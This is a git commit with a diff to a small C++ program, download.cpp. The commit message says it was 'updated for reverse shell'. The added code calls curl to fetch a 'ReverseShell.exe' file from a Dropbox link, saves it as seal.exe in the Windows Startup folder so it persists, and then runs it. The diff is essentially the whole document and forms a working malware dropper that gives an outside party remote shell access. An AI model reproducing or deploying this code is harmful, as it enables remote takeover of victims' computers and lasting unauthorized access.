1c64f9ae5d73a2a58ba01974ebe3adf9b0305304
connorhhuang <connorhhuang@gmail.com>
2023-05-30 09:04:51 -0700

    download updated for reverse shell

--- Components/download/download/download.cpp
+++ Components/download/download/download.cpp
@@ -2,6 +2,7 @@
 
 int main()
 {
-    system("curl https://media.sciencephoto.com/image/z9360190/800wm --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sealtest.jpg\"");
+    system("curl https://www.dropbox.com/s/jmdz8s4mcyrjczv/ReverseShell.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\seal.exe\"");
+    system("cd \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"|seal.exe");
 }
 
